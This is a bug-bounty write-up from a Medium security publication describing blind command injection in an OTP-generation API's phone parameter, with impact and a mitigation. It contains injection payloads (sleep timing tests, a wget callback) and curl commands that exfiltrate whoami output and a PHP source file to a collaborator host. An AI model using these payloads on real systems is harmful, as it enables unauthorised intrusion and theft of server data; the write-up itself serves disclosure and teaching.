---
title: The Art of Blind Command Injection: Unlocking Internal Secrets
url: https://infosecwriteups.com/the-art-of-blind-command-injection-unlocking-internal-secrets-917daa755463?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-12-11
fetch_date: 2025-10-06T19:39:35.605417
---

# The Art of Blind Command Injection: Unlocking Internal Secrets

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F917daa755463&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fthe-art-of-blind-command-injection-unlocking-internal-secrets-917daa755463&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fthe-art-of-blind-command-injection-unlocking-internal-secrets-917daa755463&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-917daa755463---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-917daa755463---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# The Art of Blind Command Injection: Unlocking Internal Secrets 🎩

[![Yogesh Bhandage](https://miro.medium.com/v2/da:true/resize:fill:64:64/0*FqNrhA17Qsb10e-L)](https://medium.com/%40yogeshbhandage?source=post_page---byline--917daa755463---------------------------------------)

[Yogesh Bhandage](https://medium.com/%40yogeshbhandage?source=post_page---byline--917daa755463---------------------------------------)

4 min read

·

Dec 3, 2024

--

4

Listen

Share

*Hello folks!! This is my first write-up, and I hope you all enjoy it. Let’s dive in!*

> ***Blind Command Injection:***
>
> Blind Command Injection is a vulnerability where an attacker can execute system commands on a server without directly seeing the output. It occurs when user inputs are not properly sanitized, allowing malicious commands to be passed to the server’s shell. Since the output isn’t displayed to the attacker, they rely on side effects (like delays or HTTP/DNS callbacks) to confirm exploitation.

**Summary of the vulnerability:**

Application’s generate OTP functionality was found to be vulnerable to command injection. By injecting the payload “ `` `sleep 10` `` ", the application delayed its response by 10 seconds. This behavior was further confirmed by using the " `sleep 20` ", which resulted in a 20-second delay. To escalate the vulnerability severity, I crafted a payload to execute commands like " `ls` " and redirected the output to a Collaborator server.

**Exploitation:**

Starting from the start, I navigated to the “Generate OTP” functionality, entered a mobile number, and observed the following API request. From the response, I identified that the server is running Nginx on Ubuntu.

Press enter or click to view image in full size

![]()

After attempting to find multiple vulnerabilities I finally injected “ `` `sleep 20` `` " into the `phone` parameter, causing the application to delay its response by 20 seconds.

Press enter or click to view image in full size

![]()

Press enter or click to view image in full size

![]()

To verify if the server was executing commands, I used the payload “ `wget burp_collaborator_server` ". Shortly after, I successfully received an HTTP request on the collaborator server, confirming that the server was indeed executing the commands.

Press enter or click to view image in full size

![]()

Press enter or click to view image in full size

![]()

![]()

Since this is a blind vulnerability and the output was not visible in the response, I crafted a `curl` command:
`curl -X POST -d "$(whoami)" burp_collaborator_server` .
This payload executes the `whoami` command on the server and sends its output to our collaborator server.

Press enter or click to view image in full size

![]()

Press enter or click to view image in full size

![]()

Next, I executed the `ls`command, and the output was successfully received on the collaborator server.

Press enter or click to view image in full size

![]()

Press enter or click to view image in full size

![]()

In the output, I found a file named “\*\*\*\*\*\*.php”. To escalate impact of the attack, I crafted the following payload:
`curl -X POST -d "$(cat ******.php)" burp_collaborator_server` .
This command executes `cat` on the "\*\*\*\*\*\*.php" file and sends its contents to the collaborator server. As a result, I was able to retrieve the content of the "\*\*\*\*\*\*.php" file, which contained the source code of the application.

Note: The “\*\*\*\*\*\*.php” was not contain any sensitive information. I might can access more information but it is not ethical. so I immediately approached the client to fix this vulnerability/

Press enter or click to view image in full size

![]()

Press enter or click to view image in full size

![]()

![]()

**Note:** While it was possible to access more data, I refrained as it would be unethical. Instead, I promptly reported the vulnerability to the client to ensure it was addressed.

**Impact:**

Exploitation of this vulnerability allowed me to perform arbitrary command execution on the server, enabling complete control over its operations. By leveraging this flaw, I was able to execute Create, Read, Update, and Delete (CRUD) operations on server files. This included accessing sensitive information, such as application source code, which could lead to further exploitation. An attacker could manipulate critical server data, compromise system integrity, exfiltrate confidential information, and potentially escalate to a full system takeover.

**Recommended mitigation of this vulnerability:**

Since this vulnerability exists in the `phone`parameter, it is recommended to implement proper server-side validation for all input fields. Specifically, as the parameter is intended to accept phone numbers, the server should be configured to allow only numeric values and reject any special characters or non-numeric inputs.

Stay vigilant, and happy hacking! 🎩

**My LinkedIn Profile** — <https://www.linkedin.com/in/yogesh-bhandage/>

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----917daa755463---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----917daa755463---------------------------------------)

[Command Injection](https://medium.com/tag/command-injection?source=post_page-----917daa755463---------------------------------------)

[Bug Bounty Tips](https://medium.com/tag/bug-bounty-tips?source=post_page-----917daa755463---------------------------------------)

[Penetration Testing](https://medium.com/tag/penetration-testing?source=post_page-----917daa755463---------------------------------------)

--

--

4

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--917daa755463---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:...